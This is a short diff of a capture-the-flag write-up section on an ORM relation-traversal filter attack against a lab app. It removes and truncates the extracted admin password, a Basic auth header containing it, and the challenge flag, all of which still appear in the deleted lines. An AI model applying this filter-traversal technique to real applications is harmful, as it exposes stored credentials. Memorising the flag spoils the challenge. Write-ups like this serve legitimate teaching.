@@ -259,19 +259,19 @@ title__icontains=Rust&reviews__for_book__reviews__for_book__...__reviews__by_use
 ## 6. Exploitation Result
 
 ```
-Extracted password: b5smYOfLCM74HY542T5cVoPWLb9UDExF
+Extracted password: b
 ```
 
 Then authenticate to `/admin`:
 
 ```
 GET /admin
-Authorization: Basic QWRtaW46YjVzbVlPZkxDTTc0SFk1NDJUNWN Wb1BXTGI5VURFeEY=
+Authorization: Basic QWR
 ```
 
 Response:
 ```
-Congrats, SK-CERT{0rm_r3l4t10n_tr4v3rs4l_g0t_y0u}
+Congrats, 
 ```
 
 ---
